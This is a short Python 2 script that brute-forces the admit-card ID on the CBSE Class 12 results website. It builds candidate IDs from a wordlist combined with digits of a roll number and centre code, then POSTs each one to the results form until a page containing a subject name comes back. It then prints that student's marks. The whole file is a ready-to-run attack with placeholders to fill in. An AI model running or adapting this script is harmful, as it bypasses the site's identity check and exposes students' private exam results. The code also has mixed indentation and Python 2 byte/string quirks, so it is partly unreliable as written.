import requests
import sys
from bs4 import BeautifulSoup

url = "http://cbseresults.nic.in/class12/class12th20.asp"
headers = {
    "Host": "cbseresults.nic.in",
    "Referer": "http://cbseresults.nic.in/class12/Class12th20.htm",
    "Content-Type": "application/x-www-form-urlencoded",
}

expression = "ENGLISH" # This should be any subject that you have eg. ENGLISH as shown on CBSE website
sch = '25193' # CHANGE HERE
cno = '2556' # CHANGE HERE

def brute(admid, regno):
	data = {
        'regno':regno,
        'sch': sch,
        'cno': cno,
        'admid': admid,
        'B2': 'Submit' 
    }
	r = requests.post(url, headers=headers, data=data)
	if expression in r.content :
		return r.content
        

def user(regno):
    words = [w.strip() for w in open("wl.txt", "rb").readlines()]
    for word in words:
        admid = word + regno[5] + regno[6] + cno
        content = brute(admid, regno)
        if(content):
            break
    return content        

def main():
    roll = str(sys.argv[1]).strip()
    print roll
    c = user(roll)
    if(c):
        soup = BeautifulSoup(c, 'html.parser')
        text = soup.get_text()
        text = text[(text.find('Roll No:')):(text.find('Check Another Result'))]
        print text.rstrip("\n").replace("  ", "")
    else:
        print "Could not find score(An error may have occurred, Please try again)"

if __name__ == '__main__':
	main()